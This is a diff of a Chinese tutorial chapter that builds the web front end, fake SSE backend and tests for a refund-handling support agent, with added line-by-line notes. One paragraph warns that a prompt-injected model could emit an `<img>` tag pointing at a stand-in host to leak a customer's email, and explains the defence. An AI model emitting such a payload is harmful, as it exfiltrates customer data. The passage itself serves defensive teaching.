+- `return body.split(/\[(\d+)\]/).map` split 用的正则里有捕获组时,捕获到的内容也会留在结果数组里。实测 `"a [1] b [2] c"` 切成 `["a ", "1", " b ", "2", " c"]`,奇数下标正好是编号;真实的定稿切出 5 段:文字、1、文字、2、文字。
+
+</div>
 
 ```tsx
 // supportpilot/web/src/components/Reply.tsx
@@ -843,6 +1054,17 @@ export function Reply({ text, id }: { text: string; id: string }) {
 }
 ```
 
+<div class="line-notes">
+
+- `const { body, sources } = parseReply(text);` 先拆成正文和参考文章两部分。
+- `typeof part === "number" ? (` splitCitations 返回的数组里,数字是引用编号,字符串是正文。
+- `<sup key={i}>` 实测审批后的卡片里渲染出 2 个上标,链接是 `#run-RF-T000153-INV-202609-0002-ref-1` 和 `-ref-2`,前缀来自工作台传进来的 id。
+- `<span key={i}>{part}</span>` 正文走文本节点,React 自动转义,模型吐出 `<img ...>` 也只会显示成字符。
+- `<li key={s.n}` `value={s.n}` 让有序列表的序号和正文里的 [n] 对上,哪怕编号不是从 1 连续开始。
+- `target="_blank" rel="noopener noreferrer"` 实测两个链接:「退款政策总览」指向 .../refund/001,「年付超过 14 天怎么退」指向 .../refund/003,rel 都是 noopener noreferrer,新页面拿不到 window.opener。
+
+</div>
+
 正文里的 `[1]` 渲染成上标链接,点了跳到下面的参考文章列表;参考文章渲染成真正的 `<a>`,`target="_blank"` 加 `rel="noopener noreferrer"`。
 
 这里有一条原则:**模型的输出永远当纯文本处理。** 不用 `dangerouslySetInnerHTML`,也不引一个 Markdown 渲染库把它直接转成 HTML。模型可能被提示注入,吐出一个 `<img src="https://evil.invalid/?q=客户邮箱">`,浏览器一渲染就把数据发出去了。Day 53 会专门讲这种外泄方式,今天在界面层先把门关上:React 的文本节点天然会转义,我们只把自己解析出来、格式可控的链接渲染成 `<a>`。引用链接的格式是后端 `render_sources()` 生成的,不是模型直接写的,这也是为什么要后端来拼,不让模型自己写 URL。
@@ -874,6 +1096,15 @@ export default function RootLayout({ children }: LayoutProps<"/">) {
   );
 }
 ```
+
+<div class="line-notes">
+
+- `export const metadata: Metadata = {` 只有服务端组件能导出 metadata,所以 layout 没写 "use client"。
+- `export default function RootLayout({ children }: LayoutProps<"/">) {` `LayoutProps` 是 Next.js 16 根据路由自动生成的全局类型,不用 import。实测 `next build` 的类型检查通过(TypeScript 5.9.3)。
+- `<html lang="zh-CN">` 读屏软件按中文读。
+- `<nav className="topnav" aria-label="主导航">` 页面上不止一个 nav 时,读屏靠 aria-label 区分。
+
+</div>
 
 ```css
 /* supportpilot/web/src/app/globals.css  够用就行,不引 UI 库 */
@@ -1048,6 +1279,32 @@ export default function CustomerPage() {
 }
 ```
 
+<div class="line-notes">
+
+- `"use client";` 这一页用了 useState 和事件处理,整页都是客户端组件。
+- `const DEMO_EMAILS = [` 种子数据里的客户邮箱,`nobody@example.com` 是故意不存在的,用来看「没找到这个邮箱对应的客户」那条路。实测 lina@example.com 对应 C0002 李娜。
+- `type Turn = { role: "customer"; text: string } | { role: "agent"; key: string };` 客户说的话直接存文字;Agent 那一轮只存一个 key,真正的状态在 history 里。
+- `const { state, start, stop, apply } = useRun();` 当前这一轮的实时状态。
+- `const [history, setHistory] = useState<Record<string, typeof state>>({});` `typeof state` 写在类型位置时,取的是变量的类型,也就是 RunState。
+- `const busy = state.status === "running";` 正在跑的时候禁用「新建工单」和「发送」。
+- `const key =` 实测第一次追问时 turns 还是空的,key 是 "t0"。
+- `setHistory((h) => ({ ...h, [key]: state }));` 函数式更新:参数 h 一定是最新的 history,连续调用也不会丢。
+- `customer_email: String(form.get("email")),` `form.get` 返回 `FormDataEntryValue | null`,用 `String()` 统一转成字符串。
+- `setTicketId(ticket_id);` 实测拿到 T000153。
+- `start((signal) => runTicket(ticket_id, signal));` 没有 await:流在后台跑,submit 立刻返回。实测提交后 0.1 秒状态行就是「处理中」,1.5 秒出现第一个勾,7.3 秒开始出字,10.2 秒停在审批。
+- `setSubmitError(e instanceof ApiError ? e.message : "提交失败,请检查后端是否启动");` 后端没起时 fetch 抛的是 TypeError,不是 ApiError,走后半句。
+- `archiveCurrent();` 先把当前这一轮存进历史,再开新的一轮。
+- `setTurns((t) => [...t, { role: "customer", text: msg }]);` 实测追问「多久能到账?」之后,页面上多了一个气泡,上一轮的 RunView 进了历史,一共两个 `section.run`。
+- `const content = msg;` 先存一份再清空输入框。这个函数里的 msg 其实不会因为 setMsg 而变,复制一份是让意图更清楚:发出去的就是清空之前的那一句。
+- `<form action={submit} className="ticket-form">` React 19 的 form action:直接传一个函数,React 把 FormData 交给它,不用自己 preventDefault。
+- `<select name="email" defaultValue={DEMO_EMAILS[0]}>` 非受控组件:defaultValue 只给初始值,提交时从 FormData 里读。
+- `<RunView key={i} state={history[t.key]} id={t.key} />` 历史轮次不传 onStop,不显示停止按钮。
+- `<RunView state={state} id="current" onStop={stop} />` 当前这一轮,id 是 "current",所以状态行的 id 是 `current-status`。
+- `disabled={busy || state.status === "waiting_approval"} />` 实测停在审批时追问框是禁用的;点「刷新进展」拿到 resolved 之后恢复可用。
+- `onClick={async () => apply({ event: "done", data: await getTicket(ticketId) })}>` GET 返回的摘要和 done 事件形状一样,直接当 done 喂进 reducer。
+
+</div>
+
 几个交互上的决定:
 
 - 提交表单用的是 React 19 的 form action(`<form action={submit}>`),不用自己 `preventDefault`。
@@ -1124,6 +1381,22 @@ export default function DeskPage() {
   );
 }
 ```
+
+<div class="line-notes">
+
+- `const FINANCE_REVIEW_LINE = 1000;` 只用来显示提示。真正判断要不要财务复核的是后端,interrupt 事件里的 needs_finance_review 就是后端算的。
+- `const { state, start } = useRun();` 每张卡片一个独立的 useRun,批这一笔不会影响别的卡片。
+- `const decided = state.status !== "idle";` 点过通过或驳回,按钮就收起来,防止重复提交。
+- `start((signal) => decide(r.ticket_id, { approved, approver: "demo-finance", note }, signal));` `{ approved, note }` 是属性简写,等于 `{ approved: approved, note: note }`。
+- `{r.id} · {r.customer_name} ·` 实测卡片标题是「RF-T000153-INV-202609-0002 · 李娜 · ¥950」。
+- `工单 {r.ticket_id}:` 实测这一行是「工单 T000153:想退款 · 规则 annual_first_14_days · 原因:年付首购第7天,客户表示专业版用不上,明确要求退款」。原因是模型调 create_refund_request 时自己写的,每次跑措辞都不一样。
+- `<button type="button" onClick={() => go(true)}>通过</button>` 实测备注填「首购 7 天内,符合规则」再点通过:卡片里跑出 ✓等待审批、✓定稿,状态变成「已完成 · 花费 ¥0.03198」(这两个节点不调模型,花费和审批前一样),正文末尾多了「补充:您的退款申请已审核通过,950.0 元将原路退回」和两条参考文章。
+- `const [items, setItems] = useState<PendingRefund[] | null>(null);` null 表示还没加载完,`[]` 表示加载完了但是空的,两种情况界面不一样。
+- `listApprovals().then(setItems, () => setError(` 成功直接把数组交给 setItems,失败显示提示。
+- `useEffect(load, [load]);` load 用 useCallback 包过、依赖是空数组,引用永远不变,所以这个 effect 只在页面挂载时跑一次。
+- `{items?.length === 0 &&` 实测审批完点刷新,显示「没有待审批的退款。去客户视角提交一张退款工单试试。」
+
+</div>
 
 每张审批卡片自己持有一个 `useRun`,点"通过"或"驳回"后,恢复的流程就在这张卡片里跑完,客服能看到定稿的回复和最终花费。审批后卡片不立刻从列表里消失,等客服点刷新才消失;一点就消失的话,客服没法确认自己刚才批的是哪一笔。
 
@@ -1223,8 +1496,8 @@ class H(BaseHTTPRequestHandler):
             ev = [("node", {"node": "load_customer"}, .3),
                   ("step", {"type": "step", "node": "classify", "category": "refund"}, .3), ("node", {"node": "classify"}, .1),
                   ("step", {"type": "step", "node": "retrieve", "docs": ["KB-refund-002", "KB-refund-003"]}, .3), ("node", {"node": "retrieve"}, .1),
-                  ("tool", {"type": "tool", "name": "list_invoices", "args": {"months": 2}, "error": None}, .3),
-                  ("tool", {"type": "tool", "name": "create_refund_request", "args": {"invoice_id": "INV-2291", "amount_cny": 39}, "error": None}, .3),
+                  ("tool", {"type": "tool", "name": "list_invoices", "args": json.dumps({"customer_id": "C0003"}), "error": False}, .3),
+                  ("tool", {"type": "tool", "name": "create_refund_request", "args": json.dumps({"invoice_id": "INV-2291", "reason": "同日重复扣款"}, ensure_ascii=False), "error": False}, .3),
                   ("node", {"node": "act"}, .1)]
             ev += [("token", {"type": "token", "text": "这是第一版草稿。"}, .05)]
             ev += [("step", {"type": "step", "node": "check", "passed": False, "problems": ["引用编号不存在"]}, .3)]
@@ -1254,6 +1527,32 @@ class H(BaseHTTPRequestHandler):
 
 ThreadingHTTPServer(("127.0.0.1", 8077), H).serve_forever()
 ```
+
+<div class="line-notes">
+
+- `from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer` 全是标准库。用 Threading 版本,每个请求一个线程,一个页面在收流的时候,另一个页面照样能请求。
+- `STATE = {"T1": "new"}` 整个假后端只有一张工单 T1,状态从 new 到 waiting 再到 resolved。
+- `class H(BaseHTTPRequestHandler):` 每来一个请求就新建一个 H 实例,按 HTTP 方法分发到 do_GET、do_POST、do_OPTIONS。
+- `self.send_header("Access-Control-Allow-Origin", "*")` 假后端只在本机调界面,放开所有来源;真后端只放行自己的前端。
+- `def do_OPTIONS(self):` 浏览器跨域发 POST 之前的预检请求,回 204 加上 CORS 头就行。
+- `self.send_header("content-length", str(len(b)));` 普通 JSON 响应要写长度。下面的 SSE 响应不写长度,因为事先不知道会推多少。
+- `self.wfile.write(b": ping\n\n"); self.wfile.flush()` 冒号开头是 SSE 的注释行,解析器会丢掉。先推一条,让浏览器尽早拿到响应头。实测 curl 看到的第一行就是 `: ping`。
+- `for ev, data, delay in events:` 每个元素是 (事件名, 数据, 推之前等几秒)。
+- `self.wfile.write(f"event: {ev}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n".encode()); self.wfile.flush()` 每条都手动 flush,否则会攒在缓冲区里一起到,看不出打字机效果。
+- `except (BrokenPipeError, ConnectionResetError):` 前端断开后再往里写就会抛这两种错误之一。实测前端点停止后,终端打印了 `client disconnected`。
+- `items = [] if STATE["T1"] != "waiting" else` 实测审批前返回一条「RR-0007 · 刘洋 · ¥39」,审批后返回 `[]`。
+- `n = int(self.headers.get("content-length") or 0);` 没有请求体时 header 不存在,`or 0` 兜底。
+- `("tool", {"type": "tool", "name": "list_invoices", "args": json.dumps(` args 是 JSON 字符串、error 是 False,这是我从真后端的 SSE 里照抄的形状。最初这里写的是字典和 None,界面在假后端上一切正常,接上真后端才露馅。假后端的数据要从真后端抓,别凭记忆写。
+- `ensure_ascii=False), "error": False}, .3),` 内层也加 `ensure_ascii=False`,参数里的中文才是原文,和真模型给的一样。实测点开参数显示的是 `"reason": "同日重复扣款"`。
+- `ev += [("token", {"type": "token", "text": "这是第一版草稿。"}, .05)]` 先打一版草稿。
+- `ev += [("step", {"type": "step", "node": "check", "passed": False` 故意造一次质检退回。实测前端在第 2.0 秒显示「这是第一版草稿。」,第 2.3 秒草稿清空、出现「质检退回 1 次,正在重写回复」,开始逐字打第二版。
+- `ev += [("token", {"type": "token", "text": ch}, .03) for ch in REPLY_DRAFT]` 一个字一个 token,每个间隔 30 毫秒。
+- `("done", self.summary("waiting_approval", None), .05)]` 实测第 4.3 秒停在审批,状态行是「已提交审批,等客服处理 · 花费 ¥0.0123」。
+- `if STATE["T1"] != "waiting":` 实测审批完再 POST 一次,返回 409 Conflict。
+- `"一般 3 到 5 个工作日到账。" * 6` 字符串乘 6,拉长到 96 个字,留够时间去点停止。实测 0.8 秒时打到「一般 3 到 5 个工」,点停止。
+- `def log_message(self, *a):` 覆盖掉默认的"每个请求打一行访问日志",终端里只留 client disconnected 这种有用的。
+
+</div>
 
 ```bash
 python3 web/scripts/fake_api.py &                      # 8077 端口
@@ -1327,6 +1626,23 @@ def test_sse_run_then_approve(monkeypatch):
     assert got[-1][0] == "done" and '"outcome": "resolved"' in got[-1][1]
     assert client.post(f"/approvals/{TICKET['id']}", json={"approved": True, "approver": "amy"}).status_code == 409
 ```
+
+<div class="line-notes">
+
+- `from fakes import FakeLLM, FakeTools, make_deps` 能直接 import fakes,是因为 Day 44 的 conftest.py 把 tests/ 加进了 sys.path。
+- `from langgraph.checkpoint.memory import InMemorySaver` 内存版 checkpointer,不连数据库。
+- `from test_graph_smoke import ACT, DRAFT, REFUND_TRIAGE, TICKET` 复用 Day 47 冒烟测试的剧本。实测 TICKET 是 `{"id": "T000900", "customer_email": "lina@example.com", "subject": "想退款", "body": "上周买的专业版年付,用不上,请帮我退款。"}`。
+- `def parse(text: str) -> list[tuple[str, str]]:` 一个最简单的 SSE 解析:只认 event: 和 data: 两种行。
+- `event = line[6:].strip()` `"event:"` 正好 6 个字符,切掉后去空格。
+- `out.append((event, line[5:].strip()))` `"data:"` 是 5 个字符。
+- `monkeypatch.setattr(api, "_graph", lambda: build_graph(deps, checkpointer=saver))` 把接口里编译图的函数换掉,测试结束 pytest 自动还原。
+- `events = list(api._events(api._graph(), {"ticket": TICKET}, TICKET["id"]))` 实测一共 18 个事件:3 个 tool(list_invoices、check_refund_eligibility、create_refund_request)、2 个 token(假 LLM 把草稿拆成了两段)、1 个 interrupt,最后是 done,outcome 是 waiting_approval,cost_cny 是 0.00752。
+- `client = TestClient(api.app)` 不进 with 块,lifespan 不会执行,也就不会去连数据库。
+- `got = parse(r.text)` 实测原始文本以 `'event: node\r\ndata: {"node": "approval"}\r\n\r\n'` 开头,解析出 3 条:node approval、node finalize、done。
+- `assert got[-1][0] == "done" and '"outcome": "resolved"' in got[-1][1]` 检查最后一条是 done,并且工单已经 resolved。
+- `.status_code == 409` 实测第二次审批的 detail 是「这个工单不在等待审批」。这个文件 1 passed,和 Day 47、48 的测试一起跑是 14 passed。
+
+</div>
 
 这个测试做了三件事:用假 LLM 跑 `_events`,检查事件流里有工具调用、逐字输出、审批暂停和完成;用 FastAPI 的 `TestClient` 调审批接口,解析返回的 SSE 文本,确认最后的 done 事件里工单已经 resolved;再调一次审批接口,应该返回 409,因为工单已经不在等审批了。
 
@@ -1438,6 +1754,29 @@ with desk_tab:
                     render_run(sse("POST", f"/approvals/{r['ticket_id']}",
                                    {"approved": ok, "approver": "demo-finance", "note": note}))
 ```
+
+<div class="line-notes">
+
+- `API = os.getenv("SUPPORTPILOT_API", "http://localhost:8000")` 运行时读环境变量,和 Next.js 构建时替换不一样,换地址不用重新构建。实测我是用 `SUPPORTPILOT_API=http://localhost:8049` 起的。
+- `with httpx.Client(timeout=None) as client, client.stream(method, API + path, json=payload) as r:` 一个 with 管两个上下文。`timeout=None` 是因为一张工单要跑十几秒,默认 5 秒超时会掐断。
+- `r.raise_for_status()` 409 时抛 httpx.HTTPStatusError,Streamlit 会把异常直接显示在页面上。
+- `event = "message"` SSE 规范里,没写 event: 的消息默认叫 message。
+- `yield event, json.loads(line[5:].strip())` 每读到一行 data 就产出一对 (事件名, 数据)。
+- `status = st.status("处理中…", expanded=True)` 一个可折叠的状态框,步骤和工具调用都写在里面。
+- `text_box = st.empty()` 占位符,后面每次 `.markdown()` 都覆盖同一块地方,不会越写越多。
+- `status.code(f"{data['name']}({data['args']})"` args 是字符串,直接拼出来就是 `list_invoices({"customer_id": "C0002"})` 的样子。
+- `typed = ""` 质检退回时清空打字机,和 React 版的 reducer 一个道理。
+- `text_box.markdown(typed + "▌")` 每来一个 token 就重画一次,末尾加个光标。
+- `status.update(label=f"完成 · {done.get('outcome')}` 实测停在审批时,折叠框的标题是「完成 · waiting_approval · 花费 ¥0.04666」。
+- `text_box.markdown(done.get("reply") or typed)` 停在审批时 reply 是 None,显示草稿。实测草稿里的引用还是原始的 `[KB-refund-002]`,因为只有 finalize 节点才会把它换成 [1] 加参考文章。
+- `with st.form("new_ticket"):` 表单里改输入框不会触发脚本重跑,点提交才会。
+- `st.session_state["ticket_id"] = tid` 脚本每次交互都从头跑,工单号要存进 session_state 才记得住。实测是 T000153。
+- `if tid := st.session_state.get("ticket_id"):` `:=` 是海象运算符(3.8+),赋值的同时判断真假。
+- `pending = httpx.get(f"{API}/approvals").json()` 切到工作台这个 tab 时,脚本重跑,重新拉一次待审批列表。
+- `note = st.text_input("审批备注", key=f"note-{r['id']}")` key 带上申请 id,多张卡片的输入框不会串。
+- `for col, ok, label in ((c1, True, "通过"), (c2, False, "驳回")):` 两个按钮用一个循环生成,点了哪个,那一轮脚本里 `col.button(...)` 就返回 True。
+
+</div>
 
 Streamlit 版的局限要在 README 里写清楚:每次只显示最近一轮,不保留对话历史(要保留得存进 `st.session_state`);没有登录,任何人都能审批;流式过程中不能停止。面试官看到"任何人都能审批"会问的,你提前写了就是"知道并且有计划",没写就是"没想到"。
 
